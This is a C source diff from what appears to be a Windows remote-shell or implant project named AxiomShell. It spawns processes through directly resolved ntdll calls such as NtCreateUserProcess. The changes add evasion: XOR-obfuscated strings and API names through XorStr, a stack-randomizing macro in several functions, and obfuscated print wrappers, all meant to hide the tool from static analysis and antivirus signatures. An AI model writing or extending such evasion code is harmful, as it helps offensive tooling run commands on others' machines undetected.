@@ -1,16 +1,18 @@
+#include "AxiomShell.h"
 #include "Glibc.h"
 #include "Utils.h"
 #include "Typedefs.h"
 #include "stringapiset.h"
+#include "autoxor.h"
 #include <stdio.h>
 #include <minwinbase.h>
 #include <string.h>
 #include <wchar.h>
 #include <direct.h>
 
-#define ERROR_BINARY "[!] Binary or command not found\n"
-#define ERROR_PIPE "[!] Failed to create PIPE, please try again\n"
-#define ERROR_GENERIC "[!] Unexpected error\n"
+#define ERROR_BINARY XorStr("[!] Binary or command not found\n")
+#define ERROR_PIPE XorStr("[!] Failed to create PIPE, please try again\n")
+#define ERROR_GENERIC XorStr("[!] Unexpected error\n")
 
 typedef NTSTATUS(NTAPI* _C_NtCreateUserProcess)(
     _Out_ PHANDLE ProcessHandle,
@@ -74,6 +76,7 @@ static void InitializeObjectAttributes(
 
 static const char* lookupBinaryInDir(const char* binary, const char* dir)
 {
+	STACK_RANDOMIZER;
 	char searchBuffer[260];
 	char resultBuffer[1024];
 	HANDLE hFind;
@@ -91,7 +94,7 @@ static const char* lookupBinaryInDir(const char* binary, const char* dir)
 	do {
 		if (_stricmp(ffd.cFileName, binary) == 0)
 		{
-			snprintf(resultBuffer, sizeof(resultBuffer), "%s\\%s", dir, ffd.cFileName);
+			xsnprintf(resultBuffer, sizeof(resultBuffer), "%s\\%s", dir, ffd.cFileName);
 			FindClose(hFind);
 			return (drunk_strdup(resultBuffer));
 		}
@@ -103,53 +106,55 @@ static const char* lookupBinaryInDir(const char* binary, const char* dir)
 
 const char* searchBinary(const char* binName)
 {
-    size_t cnt;
-    const char* bin_name_exe;
-    const char* path;
-    const char* result;
-    const char** syspaths;
+	STACK_RANDOMIZER;
+	size_t cnt;
+	const char* bin_name_exe;
+	const char* path;
+	const char* result;
+	const char** syspaths;
 
-    //std::ifstream fcheck(binName);
-    if ((binName[0] == '.' && binName[1] == '\\') || (binName[1] == ':' && binName[2] == '\\'))
-    {
-        if (_access(binName, 0))
-            return (NULL);
-        return (drunk_strdup(binName));
-    }
+	//std::ifstream fcheck(binName);
+	if ((binName[0] == '.' && binName[1] == '\\') || (binName[1] == ':' && binName[2] == '\\'))
+	{
+		if (_access(binName, 0))
+			return (NULL);
+		return (drunk_strdup(binName));
+	}
 
-    cnt = 0;
-    path = drunk_getenv("Path");
-    syspaths = drunk_strsplit(path, ';');
-    printf("PATH = %s\n", path);
+	cnt = 0;
+	path = drunk_getenv(XorStr("Path"));
+	syspaths = drunk_strsplit(path, ';');
+	DEBUG_LOG("PATH = %s\n", path);
 
-    if (strcmp(binName + strlen(binName) - strlen(".exe"), ".exe") != 0)
-    {
-        bin_name_exe = (char*)malloc(strlen(binName) + strlen(".exe") + 1);
-        drunk_strcpy((char*)bin_name_exe, binName);
-        drunk_strcat((char*)bin_name_exe, ".exe");
-    }
-    else {
-        bin_name_exe = NULL;
-    }
+	if (strcmp(binName + strlen(binName) - strlen(".exe"), ".exe") != 0)
+	{
+		bin_name_exe = (char*)malloc(strlen(binName) + strlen(".exe") + 1);
+		drunk_strcpy((char*)bin_name_exe, binName);
+		drunk_strcat((char*)bin_name_exe, ".exe");
+	}
+	else {
+		bin_name_exe = NULL;
+	}
 
-    while (syspaths[cnt] != NULL)
-    {
-        result = lookupBinaryInDir(bin_name_exe == NULL ? binName : bin_name_exe, syspaths[cnt]);
-        if (result != NULL)
-        {
-            if (bin_name_exe != NULL)
-                free((void*)bin_name_exe);
-            return (result);
-        }
-        cnt++;
-    }
-    if (bin_name_exe != NULL)
-        free((void*)bin_name_exe);
-    return (NULL);
+	while (syspaths[cnt] != NULL)
+	{
+		result = lookupBinaryInDir(bin_name_exe == NULL ? binName : bin_name_exe, syspaths[cnt]);
+		if (result != NULL)
+		{
+			if (bin_name_exe != NULL)
+				free((void*)bin_name_exe);
+			return (result);
+		}
+		cnt++;
+	}
+	if (bin_name_exe != NULL)
+		free((void*)bin_name_exe);
+	return (NULL);
 }
 
 size_t CORE_process_invoke(const char *binaryName, const char *arguments, const char **buffer)
 {
+	STACK_RANDOMIZER;
 	NTSTATUS status;
 	UNICODE_STRING uImage;
 	UNICODE_STRING uNtImage;
@@ -169,11 +174,11 @@ size_t CORE_process_invoke(const char *binaryName, const char *arguments, const 
 	wchar_t* unicodeParams;
 
 	hNtdll = LoadLibraryA("ntdll.dll\0");
-	CreateUserProcess = (_C_NtCreateUserProcess)(void*)GetProcAddress(hNtdll, "NtCreateUserProcess");
-	CreateParams = (_C_RtlCreateProcessParametersEx)(void*)GetProcAddress(hNtdll, "RtlCreateProcessParametersEx");
-	InitUnicode = (_C_RtlInitUnicodeString)(void*)GetProcAddress(hNtdll, "RtlInitUnicodeString");
-	AllocateHeap = (_C_RtlAllocateHeap)(void*)GetProcAddress(hNtdll, "RtlAllocateHeap");
-	FreeHeap = (_C_RtlFreeHeap)(void*)GetProcAddress(hNtdll, "RtlFreeHeap");
+	CreateUserProcess = (_C_NtCreateUserProcess)(void*)GetProcAddress(hNtdll, XorStr("NtCreateUserProcess"));
+	CreateParams = (_C_RtlCreateProcessParametersEx)(void*)GetProcAddress(hNtdll, XorStr("RtlCreateProcessParametersEx"));
+	InitUnicode = (_C_RtlInitUnicodeString)(void*)GetProcAddress(hNtdll, XorStr("RtlInitUnicodeString"));
+	AllocateHeap = (_C_RtlAllocateHeap)(void*)GetProcAddress(hNtdll, XorStr("RtlAllocateHeap"));
+	FreeHeap = (_C_RtlFreeHeap)(void*)GetProcAddress(hNtdll, XorStr("RtlFreeHeap"));
 
 	nonUnicodePath = searchBinary(binaryName);
 	if (nonUnicodePath == NULL)
@@ -244,7 +249,8 @@ size_t CORE_process_invoke(const char *binaryName, const char *arguments, const 
 	ProcessParameters->StandardError = pipeWrite;
 
 	// Initialize the PS_CREATE_INFO structure
-	PS_CREATE_INFO CreateInfo = { 0 };
+	PS_CREATE_INFO CreateInfo;
+	memset(&CreateInfo, 0, sizeof(PS_CREATE_INFO));
 	CreateInfo.Size = sizeof(CreateInfo);
 	CreateInfo.State = PsCreateInitialState;
 
@@ -318,7 +324,7 @@ size_t CORE_process_invoke(const char *binaryName, const char *arguments, const 
 		AttributeList      //attributeList
 	);
 	if (CreateInfo.State != PsCreateSuccess) {
-		printf("[!] Failed to invoke process, handle = 0x%px (State = %d) (NTSTATUS = 0x%lx)\n", hProcess, CreateInfo.State, status);
+		xprintf("[!] Failed to invoke process, handle = 0x%px (State = %d) (NTSTATUS = 0x%lx)\n", hProcess, CreateInfo.State, status);
 		*buffer = drunk_strdup("");
 		free(unicodePath);
 		free(unicodeNtPath);
